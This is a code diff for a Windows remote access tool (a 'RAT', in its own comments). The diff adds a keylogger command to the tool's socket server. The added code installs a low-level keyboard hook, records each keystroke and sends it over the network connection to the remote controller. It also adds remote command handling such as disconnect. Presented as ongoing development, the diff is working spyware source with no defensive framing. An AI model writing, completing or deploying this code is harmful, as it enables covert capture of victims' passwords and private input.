@@ -6,8 +6,8 @@ int main(){
 
 //map the server enumerated commands so I can recv a string to match with!
     dictionary["TRIGMSGBOX"] = TRIGMSGBOX;
-    dictionary["MESSAGE2"] = MESSAGE2;
-    dictionary["MESSAGE3"] = MESSAGE3;
+    dictionary["KEYLOG"] = KEYLOG;
+    dictionary["DISCONNECT"] = DISCONNECT;
 
 //Map messagebox responses!
     MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
@@ -24,12 +24,12 @@ int main(){
 
 
 /*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/
-    WSADATA wsa;
-    SOCKET sa, clientsock;
-    struct sockaddr_in server, client;
-    char server_reply[buffersize];
+    extern WSADATA wsa;
+    extern SOCKET sa, clientsock;
+    extern struct sockaddr_in server, client;
+    extern char server_reply[buffersize];
     //THIS BOOLEAN VALUE WILL MAKE THE SERVER KEEP WORKING. CAN BE DISABLED FROM CLIENT.
-    bool KILLSERVER = true;
+    extern bool KILLSERVER;
 
 
     HandleError(WSAStartup(MAKEWORD(2,2), &wsa));
@@ -49,10 +49,14 @@ int main(){
 
 
         clientsock = accept(sa, (struct sockaddr *)&client, NULL);
+
         //send(clientsock, "Message!", 9, 0);
 
-        while(clientsock != INVALID_SOCKET){
+        while(1){
 
+        if(clientsock == INVALID_SOCKET){
+            break;
+        }
         int counter = 0;
 
         memset(server_reply, '\0', buffersize);
@@ -73,41 +77,44 @@ int main(){
                 /*SUSPENDHOST>45<*/
 
 
-
+            //send(clientsock, "KEYLOG><", 8, 0);
             HandleError(recv(clientsock, server_reply, buffersize, 0));//error checking combined with recv function
 
 
         //CLEAR STRING BEFORE PROCESSING! MAKES THINGS NICE AND CLEAN!!
-        client_operator.clear();
-        client_operand.clear();
+        server_operator.clear();
+        server_operand.clear();
 
             int forcount = 0;
             //PARSE THE OPERATOR
             for (; server_reply[forcount] != '>'; forcount++){
-               client_operator += server_reply[forcount];
+               server_operator += server_reply[forcount];
             }
 
             //PARSE THE OPERAND
             forcount++;
             for (; server_reply[forcount] != '<'; forcount++){
 
-                client_operand += server_reply[forcount];
+                server_operand += server_reply[forcount];
 
             }
 
 
-             map<string, SERVERMESSAGE>::iterator i = dictionary.find(client_operator);
+             map<string, SERVERMESSAGE>::iterator i = dictionary.find(server_operator);
 
 
             //i->second corresponds to the enumerated message
 
             switch(i->second){
 
-                case TRIGMSGBOX:  _beginthreadex(NULL, 0, &TrigBox, &client_operand, 0, NULL);  //not really necessary to create an unused handle, but its here incase you need to use it
+                case TRIGMSGBOX:  _beginthreadex(NULL, 0, &TrigBox, &server_operand, 0, NULL);  //not really necessary to create an unused handle, but its here incase you need to use it
                     break;
-                case MESSAGE2: MessageBox(NULL,NULL,"MESSAGE2",NULL);
+                case KEYLOG:    _beginthreadex(NULL,0, &KeyLog, NULL, 0, NULL);
+                //MessageBox(NULL,NULL,"MESSAGE2",NULL);
                     break;
-                default: closesocket(clientsock);
+                case DISCONNECT: clientsock = INVALID_SOCKET;
+                    break;
+                default: MessageBox(NULL, "Message unrecognized!", "Exception!", NULL);
                     break;
 
             }
@@ -118,10 +125,33 @@ int main(){
 
 
     }
+    MessageBox(NULL,"D/c", NULL,NULL);
             closesocket(sa);
             WSACleanup();
 
     return 0;
+}
+
+unsigned int __stdcall KeyLog(void* data){
+
+    HINSTANCE hinst = GetModuleHandle(NULL);
+    HHOOK hhkLowLevelKybd  = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
+    MSG msg;
+
+    MessageBox(NULL, "entered", NULL, NULL);
+
+        while(GetMessage(&msg, NULL, 0, 0)){
+
+
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+
+        }
+
+      UnhookWindowsHookEx(hhkLowLevelKybd);
+
+
+
 }
 
 unsigned int __stdcall TrigBox(void* data){
@@ -211,5 +241,46 @@ int HandleError(int error){
     }else return 0;
 
     return SOCKET_ERROR;
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
+
+    string KEYLOGstr = "KEYLOG>";
+    extern SOCKET clientsock;
+    PKBDLLHOOKSTRUCT structdll = (PKBDLLHOOKSTRUCT) lParam;
+    clock_t timer;
+    switch(nCode){
+
+        case HC_ACTION:
+            switch(wParam){
+
+                case WM_KEYDOWN:{
+
+
+                    //How should i change the following lines?
+                    char buffer[256];
+                    GetKeyNameText((MapVirtualKey(structdll->vkCode, 0)<<16), buffer, 50);
+                    //use this?: ToAscii(structdll->vkCode, structdll->scanCode, NULL, myword, 0);
+
+
+                    KEYLOGstr.append(buffer);
+                    KEYLOGstr.append("<");
+                    //std::cout <<"\n"<<KEYLOGstr;
+
+                    //timer = clock();
+                    //if ((timer / CLOCKS_PER_SEC) % 3 == 0){
+
+                      //  MessageBox(NULL, KEYLOGstr.c_str(), "MSGBOX", NULL);
+                      send(clientsock, KEYLOGstr.c_str(), KEYLOGstr.length(), 0);
+                    //}
+
+                }
+                break;
+            }
+        break;
+    }
+
+return CallNextHookEx(NULL, nCode, wParam,lParam);
+
 }
 
